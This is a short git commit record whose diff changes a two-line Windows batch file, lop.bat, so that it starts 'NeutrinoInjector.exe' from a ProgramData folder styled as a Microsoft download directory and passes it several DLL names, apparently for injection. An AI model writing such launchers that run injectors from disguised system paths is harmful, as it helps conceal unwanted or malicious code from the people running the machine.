a3efc943d783d7fb36918153d82e74baa28bdf81
braskunic <127238832+braskunic@users.noreply.github.com>
2024-04-09 09:25:41 -0700

    Update lop.bat

--- lop.bat
+++ lop.bat
@@ -1,2 +1,2 @@
 @echo off
-start "" "C:\ProgramData\Microsoft\Network\Downloads\NeutrinoInjector.exe"
+start "" "C:\ProgramData\Microsoft\Network\Downloads\NeutrinoInjector.exe" start temka.dll start undct.dll start NeutrinoAgent.dll
